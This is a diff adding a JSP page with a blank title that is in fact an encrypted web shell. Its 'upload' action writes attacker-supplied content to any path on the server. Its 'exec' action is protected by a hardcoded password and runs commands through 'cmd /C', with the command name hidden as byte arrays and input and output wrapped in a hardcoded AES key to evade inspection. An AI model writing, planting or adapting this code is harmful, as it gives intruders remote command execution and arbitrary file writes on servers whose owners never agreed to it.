@@ -1,0 +1,111 @@
+<%@ page import="javax.crypto.Cipher" %>
+<%@ page import="javax.crypto.spec.SecretKeySpec" %>
+<%@ page import="javax.crypto.spec.IvParameterSpec" %>
+<%@ page import="sun.misc.BASE64Encoder" %>
+<%@ page import="sun.misc.BASE64Decoder" %>
+<%@ page import="java.io.*" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<html>
+<head>
+    <title>Title</title>
+</head>
+<body>
+<%!
+
+    public static class AEScrypt {
+        private static String sKey = "JejEOrai3DhYR8q8";
+        private static String ivParameter = "67NfRvQARK3sqkwA";
+
+        public static String encrypt(String sSrc) throws Exception {
+            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+            byte[] raw = sKey.getBytes();
+            SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
+            IvParameterSpec iv = new IvParameterSpec(ivParameter.getBytes());
+            cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);
+            byte[] encrypted = cipher.doFinal(sSrc.getBytes("utf-8"));
+            return new BASE64Encoder().encode(encrypted);
+        }
+
+        public static String decrypt(String sSrc) {
+            try {
+                byte[] raw = sKey.getBytes("ASCII");
+                SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
+                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+                IvParameterSpec iv = new IvParameterSpec(ivParameter.getBytes());
+                cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);
+                byte[] encrypted1 = new BASE64Decoder().decodeBuffer(sSrc);
+                byte[] original = cipher.doFinal(encrypted1);
+                String originalString = new String(original, "utf-8");
+                return originalString;
+            } catch (Exception ex) {
+                return null;
+            }
+        }
+
+    }
+
+%>
+
+<%
+    AEScrypt aes = new AEScrypt();
+
+
+
+    if ("upload".equals(request.getParameter("act"))){
+        if (request.getParameter("path") != null && request.getParameter("context") != null) {
+
+            String context=new String(request.getParameter("context").getBytes("ISO-8859-1"),"gb2312");
+            String path=new String(request.getParameter("path").getBytes("ISO-8859-1"),"gb2312");
+            OutputStream pt = null;
+            try {
+                String fpath = request.getParameter("path");
+                String filepath = aes.decrypt(fpath);
+                String fcontext = request.getParameter("context");
+                String filecontext = aes.decrypt(fcontext);
+                pt = new FileOutputStream(filepath);
+                pt.write(filecontext.getBytes());
+                 } catch (FileNotFoundException ex2) {
+                out.println("upload failed!");
+            } catch (IOException ex) {
+                out.println("upload failed!");
+            } finally {
+                try {
+                    pt.close();
+                } catch (IOException ex3) {
+                    out.println("upload failed!");
+                }
+                }
+            }
+
+    }
+
+    else if ("exec".equals(request.getParameter("act"))){
+        if(request.getParameter("newid") != null && request.getParameter("pwd").equals("sevck") ){
+            String commandEnc = request.getParameter("newid");
+            String command = aes.decrypt(commandEnc);
+
+            try {
+
+                ProcessBuilder pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), command);
+                pb.redirectErrorStream(true);
+                Process pro = pb.start();
+                InputStream in = pro.getInputStream();
+                BufferedReader br = new BufferedReader(new InputStreamReader(in));
+                String lineStr;
+                String allStr;
+                allStr = "";
+                while ((lineStr = br.readLine()) != null) {
+                    allStr += lineStr + "\r\n";
+                }
+                out.print(aes.encrypt(allStr));
+            }catch (Exception e){
+                String error =e.getMessage();
+            }
+        }else {
+            out.print("");
+        }
+    }
+
+%>
+</body>
+</html>
